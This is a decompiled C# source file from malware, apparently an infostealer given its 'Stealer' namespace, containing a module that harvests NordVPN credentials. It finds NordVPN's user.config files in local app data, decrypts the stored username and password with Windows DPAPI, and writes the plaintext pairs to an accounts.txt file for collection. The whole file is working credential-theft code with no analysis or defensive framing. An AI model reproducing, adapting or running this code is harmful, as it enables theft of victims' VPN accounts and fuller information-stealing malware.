using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Stealer
{
	// Token: 0x02000021 RID: 33
	internal sealed class NordVPN
	{
		// Token: 0x060000A7 RID: 167 RVA: 0x0000628C File Offset: 0x0000448C
		private static string Decode(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000062D0 File Offset: 0x000044D0
		public static void Save(string sSavePath)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
			if (!directoryInfo.Exists)
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
					{
						string text = Path.Combine(directoryInfo2.FullName, "user.config");
						if (File.Exists(text))
						{
							Directory.CreateDirectory(sSavePath + "\\" + directoryInfo2.Name);
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text);
							string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
							string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
							if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
							{
								string text2 = NordVPN.Decode(innerText);
								string text3 = NordVPN.Decode(innerText2);
								Counter.VPN++;
								File.AppendAllText(sSavePath + "\\" + directoryInfo2.Name + "\\accounts.txt", string.Concat(new string[]
								{
									"Username: ",
									text2,
									"\nPassword: ",
									text3,
									"\n\n"
								}));
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
